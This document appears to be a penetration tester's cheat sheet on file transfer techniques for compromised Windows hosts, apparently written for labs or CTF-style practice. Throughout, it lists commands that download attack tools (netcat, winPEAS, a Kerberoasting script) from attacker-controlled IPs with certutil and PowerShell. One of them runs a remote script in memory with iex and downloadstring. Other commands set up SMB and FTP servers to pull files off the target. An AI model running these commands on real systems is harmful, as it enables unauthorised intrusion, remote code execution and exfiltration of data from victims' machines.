  # File Transfers
---------------------------

## CertUtil 
```cmd
certutil -urlcache -split -f "http://192.168.119.213:8000/nc.exe" nc.exe
```

## PowerShell
```Powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.0.2.15:8009/winpeas.exe', 'winpeas.exe')"
```

```Powershell
powershell Invoke-WebRequest -Uri IP:PORT/nc.exe -OutFile C:\Users\Public\nc.exe
```

```Powershell
iex(new-object system.net.webclient).downloadstring("http://192.168.119.230/GetUserSPNs.ps1.ps1")
```

```Powershell
powershell -c iwr http://10.10.14.51:8010/nc.exe -outfile nc.exe 
```

## FTP 

ftp server using python:

```bash
pip3 install pyftpdlib
```

```bash
sudo python3 -m pyftpdlib -u cbbn -P passw0rd123 -p 21 --write
```

## SMB 

### Transfer from our PC to windows:

```bash
python3 smbserver.py share /home/cibbin/
```

```cmd
copy \\IP\share\file_name.exe
```

### From windows to our PC:

smbserver

```bash
python3 smbserver.py -smb2support share .
```

smbserver with creds:

```bash
python3 smbserver.py share /home/cibbin/ -smb2support -username cibbin -password root123
```

 - add the share in windows and connect to it:

```cmd 
net use \\IP\share /u:cibbin root123

copy filename.zip \\IP\share\

del filename

net use /d \\IP\share	#delete the mounted share
```

its important to delete the mounted share since it will use the same creds when logging in next time 

net use  */del 




